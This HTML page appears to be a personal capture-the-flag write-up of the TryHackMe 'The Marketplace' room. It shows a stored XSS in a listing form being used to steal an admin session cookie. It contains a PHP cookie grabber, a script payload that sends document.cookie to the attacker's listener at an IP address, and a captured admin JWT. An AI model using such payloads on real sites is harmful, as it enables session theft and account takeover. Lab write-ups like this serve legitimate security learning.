<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>XSS Cross Site Scripting</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>XSS Cross Site Scripting</h1><br/>Source ----â†’ THM: The Marketplace<br /><br /><strong><h3>XSS Vulnerability Exploit</h3></strong><br />I tried various enumerations and found that the website is vulnerable to <strong>XSS</strong> (<strong>Cross Site Scripting</strong>) in the item listing field.<br />We will use this vulnerability to get the admin cookie and login as admin.<br /><br /><strong>Following are the steps:</strong> <br /><br />1. Create a user with some password in the <strong>Sign up</strong><br />	<strong>Site User</strong><br />	Username: <strong>Bob</strong><br />	Password: <strong>12345</strong>	<br />	<br />2. Go to <strong>Login</strong> and login to the site using the above user.<br />	<br />	<img src="images/207-1.png" alt="images/207-1.png" /><br /><br />3. The <strong>XSS vulnerability</strong> lies in the <strong>New listing</strong> form. I open it and add simple javascript alert code. <br />	<br />	<strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong><br />	<img src="images/207-2.png" alt="images/207-2.png" /><br />	<br />4. Once I hit submit. The item is added and i get my script alert, indicating the XSS vulnerability.<br />   <img src="images/207-3.png" alt="images/207-3.png" /><br /><br />	<strong>Note:</strong> The item is now added into our existing items in the home page and we can also activate the script by opening it from there.<br />	If we click on xss_test_1, we will get the above page again.<br />	<img src="images/207-4.png" alt="images/207-4.png" /><br /><br /><br />	<strong>Hint:</strong> <strong>If you think a listing is breaking the rules, you can report it!</strong><br /> <br />	<strong>Findings</strong>:<br /><br />	When i open any item there is a link to <strong>report</strong> it to <strong>admin</strong>. If you <strong>report</strong> any item, it will give us 2 messages.<br />	<img src="images/207-5.png" alt="images/207-5.png" /><br />	Then Click on <strong>report</strong><br />	<img src="images/207-6.png" alt="images/207-6.png" /><br />	<strong>Message: 1 </strong><br />	It comes instantly stating our request has been<strong> sent to admin </strong>for <strong>evaluation</strong>.<br />	<img src="images/207-7.png" alt="images/207-7.png" /><br />	<strong>Message: 2</strong><br />	After opening the <strong>Messages</strong> tab we find the admin&#39;s reply.<br />	<img src="images/207-8.png" alt="images/207-8.png" /><br />	<br />	Now, lets try to report our Javascript enabled item.<br />	I <strong>reported</strong> the <strong>xss_test_1</strong> item and got <strong>2 messages</strong> again.<br />	This time the <strong>admin</strong>&#39;s reply was intresting.<br />	<br />	<img src="images/207-9.png" alt="images/207-9.png" /><br />	<br />	The reply confirms that javascript is working in the admin area. However, alerts are blocked.<br />	<br />	<br />	<br />5. No worries, we won&#39;t need <strong>alert</strong> anyway.<br />	<br />	<strong>Note:</strong> Following code will work on php based web servers<br />	<br />	<strong>PHP Cookie Grabber</strong><br /><strong>	&lt;?php<br />	<br />	$cookie = $_GET[&#39;c&#39;];<br />	$fp = fopen(&#39;cookies.txt&#39;, &#39;a+&#39;);<br />	fwrite($fp, &#39;Cookie:&#39; .$cookie.&quot;\r\n&quot;);<br />	fclose($fp);<br />	<br />	?&gt;</strong><br />	<br />	I created a <strong>grabber.php</strong> file &amp; started the <strong>netcat listener</strong> on port <strong>8000</strong> or <strong>python http server </strong>on port <strong>8000</strong><br />	<br /><strong>	Note: </strong>As we are not using a php webserver, no output will be written in our server. We will just capture the initial request in netcat or python web server terminal logs	<br />	Therefore, any made up name can be used, it will still work. 	Eg. <strong>http://10.11.72.31:8000/rockstar.php?z=</strong><br />	<br />	<br />	Then create a new item (Say<strong> xss_test_2</strong>), with the following javascript code in the description.<br />	<strong>&lt;script&gt;document.location=&#39;http://10.11.72.31:8000/grabber.php?c=&#39;+document.cookie&lt;/script&gt;</strong><br />	<img src="images/207-10.png" alt="images/207-10.png" /><br />6. Now <strong>report</strong> the <strong>xss_test_2</strong> item to the admin and the admin will open the item for evaluation, we should get the admin cookie in our <strong>netcat listener or python http server</strong><br />	<br />	When i tried to open the xss_test_2 it won&#39;t open at it is getting redirected to a local page which doesn&#39;t exit. Netcat however, catches user Bob&#39;s cookie as expected.<br />	<br />	<img src="images/207-11.png" alt="images/207-11.png" /><br />	<br />	Netcat Response<br />	<img src="images/207-12.png" alt="images/207-12.png" /><br />	<br />	<br />	But we need to report it for the admin to open and we get the admin cookie. So i llok back to the previous report&#39;s URL.<br />	<strong>http://10.10.187.53/report/1</strong> for first item and <strong>http://10.10.187.53/report/3</strong> for the xss_test_1<br />	<br />	So lets use <strong>http://10.10.187.53/report/4</strong> to report the xss_test_2<br />	<br />	<img src="images/207-13.png" alt="images/207-13.png" /><br />	<br />	We click on <strong>Report</strong> and check our netcat listner<br />	<br />	<img src="images/207-14.png" alt="images/207-14.png" /><br />	<br />	We got the admin cookie.<br />	<strong>Admin Cookie:</strong> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NTU5ODczMDB9.3gpiMWBVHvUPovTYt_fJRbR4W_NpDSnmzK-x-gOl7_8<br />	<br />7. Open the <strong>/admin</strong> link and replace the cookie with the above found cookie using <strong>burpsuite</strong> or <strong>cookie editor</strong>.<br /><br />	<img src="images/207-15.png" alt="images/207-15.png" /><br />	<br />	We successfully logged in as <strong>Administrator</strong> &amp; got the first flag.</div>
</body>
</html>
